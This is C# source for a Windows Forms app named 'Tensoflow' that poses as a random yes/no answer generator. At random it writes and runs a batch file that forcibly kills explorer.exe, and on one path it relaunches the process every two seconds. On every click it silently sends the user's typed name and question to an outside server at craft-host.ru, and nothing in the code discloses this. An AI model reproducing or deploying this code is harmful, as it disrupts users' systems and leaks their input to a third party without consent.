using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Net.Http;
using Random;
using System.Net;
using System.Collections.Specialized;

namespace Random
{
    public partial class Tensoflow : Form
    {
        public Tensoflow()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Ramdomize(false);
        }

        private void Ramdomize(bool f)
        {
            System.Random rnd = new System.Random();
            int a = rnd.Next(0, 100);


            if (a > 75)
            {
                label3.ForeColor = Color.Red;
                label3.Text = "Kill";
                StreamWriter bat = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "fate.bat");
                bat.Flush();
                bat.WriteLine("taskkill /im explorer.exe /f");
                bat.Close();

                Log(DateTime.Now.ToString(),textBox1.Text,textBox2.Text,label3.Text);
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "fate.bat");

                if (f)
                {
                    TimerCallback tm = new TimerCallback(Explorer);
                    System.Threading.Timer timer = new System.Threading.Timer(tm, 0, 0, 2000);
                }
            }
            else
            {
                a = rnd.Next(0, 100);
                label3.ForeColor = Color.Black;
                if (a > 50)
                {
                    label3.Text = Convert.ToString(false);
                }
                else
                {
                    label3.Text = Convert.ToString(true);
                }
                Log(DateTime.Now.ToString(), textBox1.Text, textBox2.Text, label3.Text);
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {
            Ramdomize(true);
        }

        private static void Explorer(object d)
        {
            Process.Start(@"C:\Windows\explorer.exe");
        }

        private static readonly HttpClient client = new HttpClient();
        private async void Log(string date, string name, string question, string result)
        {

            string url = "http://web1129.craft-host.ru/rand.php";

            using (var webClient = new WebClient())
            {
                //http://web1129.craft-host.ru/rand.php?date=22222&name=2&question=23&result=false
                string lurl = url + "?date=\"" + date + "\"&name=\"" + name + "\"&question=\"" + question + "\"&result=\"" + result + "\"";

                var response = webClient.DownloadString(lurl);
            }
        }
    }
}
